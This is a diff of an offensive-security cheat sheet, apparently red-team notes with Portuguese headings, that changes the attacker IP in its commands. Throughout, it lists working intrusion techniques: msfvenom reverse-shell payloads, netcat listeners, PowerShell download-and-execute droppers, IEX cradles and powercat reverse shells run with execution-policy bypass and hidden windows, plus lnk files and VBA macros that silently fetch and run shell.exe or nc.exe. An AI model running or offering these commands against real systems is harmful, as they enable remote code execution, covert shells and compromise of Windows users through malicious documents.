@@ -123,13 +123,17 @@ Get-PSReadLineOption
 ### PowerShell Dropper
 ### Kali Linux
 ```
-$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.118 LPORT=4444 -f exe -o shell.exe
-$ nc -nlvp 4444
-$ python -m http.server 80
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.52.50 LPORT=4444 -f exe -o shell.exe
+```
+```
+nc -nlvp 4444
+```
+```
+python -m http.server 80
 ```
 ### Windows
 ```
-$url = "http://192.168.2.118/shell.exe" 
+$url = "http://192.168.52.50/shell.exe" 
 ```
 ```
 $out = "C:\Users\admin\Desktop\shell.exe" 
@@ -145,10 +149,10 @@ C:\Users\admin\Desktop\shell.exe
 ```
 ### PowerShell Dropper OneLiner
 ```
-(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.118/shell.exe', 'C:\Users\admin\Desktop\shell.exe');C:\Users\admin\Desktop\shell.exe
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.52.50/shell.exe', 'C:\Users\admin\Desktop\shell.exe');C:\Users\admin\Desktop\shell.exe
 ```
 ```
-(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.118/nc.exe', 'C:\Users\admin\Desktop\nc.exe');C:\Users\admin\Desktop\nc.exe 192.168.2.118 4444 -e cmd
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.52.50/nc.exe', 'C:\Users\admin\Desktop\nc.exe');C:\Users\admin\Desktop\nc.exe 192.168.52.50 4444 -e cmd
 ```
 ### PowerShell Execute Remote Script by IEX - powershell "IEX(New-Object System.Net.WebClient).DownloadString('URL')"
 ```
@@ -161,13 +165,13 @@ whoami
 ```
 Windows
 ```
-IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/smith')
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.52.50/smith')
 ```
 ### PowerShell Dropper OneLine com IEX
 Kali Linux
 ```
 $ cat dropper
-$url = "http://192.168.2.118/shell.exe"
+$url = "http://192.168.52.50/shell.exe"
 $out = "C:\Users\admin\Desktop\shell.exe"
 $wc = New-Object Net.WebClient
 $wc.DownloadFile($url, $out)
@@ -175,34 +179,34 @@ C:\Users\admin\Desktop\shell.exe
 ```
 Windows
 ```
-IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/dropper')
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.52.50/dropper')
 ```
 Kali Linux
 ```
 $ cat dropper1
-$url = "http://192.168.2.118/nc.exe"
+$url = "http://192.168.52.50/nc.exe"
 $out = "C:\Users\admin\Desktop\nc.exe"
 $wc = New-Object Net.WebClient
 $wc.DownloadFile($url, $out)
-C:\Users\admin\Desktop\nc.exe 192.168.2.118 4444 -e cmd
+C:\Users\admin\Desktop\nc.exe 192.168.52.50 4444 -e cmd
 ```
 Windows
 ```
-IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/dropper1')
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.52.50/dropper1')
 ```
 ### PowerCat com IEX
 ```
-.\nc.exe -nlvp 8000
+nc.exe -nlvp 8000
 ```
 ```
-powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.2.118 -p 8000 -e cmd"
+powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.52.50 -p 8000 -e cmd"
 ```
 ### lnk File with PowerCat
 ```
-powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.2.118 -p 8000 -e cmd"
+powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.52.50 -p 8000 -e cmd"
 ```
 ```
-powershell.exe -ExecutionPolicy Bypass -noLogo -w hidden -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.2.118 -p 8000 -e cmd"
+powershell.exe -ExecutionPolicy Bypass -noLogo -w hidden -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.52.50 -p 8000 -e cmd"
 ```
 
 ## VBA com Powershell em Macros
@@ -325,7 +329,7 @@ End Sub
 
 Sub RedScan()
     Dim str As String
-    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.2.118/shell.exe', 'shell.exe')"
+    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.52.50/shell.exe', 'shell.exe')"
     Shell str, vbHide
     Dim exePath As String
     exePath = ActiveDocument.Path & "\" & "shell.exe"
@@ -355,7 +359,7 @@ End Sub
 
 Sub RedScan()
     Dim str As String
-    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/dropper1')|IEX"
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.52.50/dropper1')|IEX"
     Shell str, vbHide
 
 End Sub
